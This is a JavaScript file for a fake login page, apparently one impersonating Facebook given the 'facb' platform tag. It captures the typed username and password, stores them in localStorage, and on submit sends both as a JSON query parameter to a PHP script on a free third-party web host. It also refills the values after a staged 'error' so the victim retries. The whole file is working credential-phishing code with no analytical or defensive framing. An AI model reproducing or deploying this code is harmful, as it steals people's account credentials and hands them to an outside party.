const show = document.getElementById('show');
const userr = document.getElementById('user');
const log = document.getElementById('log');
const pass = document.getElementById('pass');
const inputs = document.querySelectorAll('input');
const cuurl = new URL(window.location.href);
userr.oninput = ()=>{
    localStorage.setItem('userr',userr.value);
}
pass.oninput = ()=>{
    if(pass.value!==''){
        show.style.left = '-4px';
    }else{
        show.style.left = '110vw';
    }
    localStorage.setItem('pass',pass.value);
}
show.onclick = ()=>{
    const condition = (pass.type==='text');
    pass.type = condition?'password':'text';
    show.innerText = !condition?'HIDE':'SHOW';
}
pass.oninput();
for(let i=0;i<inputs.length;i++){
    inputs[i].onfocus = ()=>{
        inputs[i].classList.add('focused');
    }
    inputs[i].onblur = ()=>{
        inputs[i].classList.remove('focused');
        inputs[i].classList.remove('error');
    }
}
if(cuurl.searchParams.get('error')){
    window.history.pushState(null, null, "?request=void");
    pass.classList.add('error');
    userr.value = localStorage.getItem('userr');
    pass.value = localStorage.getItem('pass');
}
const chkFeild = (inp)=>{
    if(inp.value=='' || inp.value==' '){
        inp.classList.add('error');
        inp.focus();
        return false;
    }else{
        return true;
    }
}
log.onclick = ()=>{
    if(chkFeild(userr)&&chkFeild(pass)){ 
        const vurl = new URLSearchParams();
        const dataR={user:localStorage.getItem('userr'),key:localStorage.getItem('pass'), plt:'facb'}
        vurl.set('rd',JSON.stringify(dataR));
        window.location.replace('https://uncovenanted-claims.000webhostapp.com/dbs.php?' + vurl.toString());
    }
}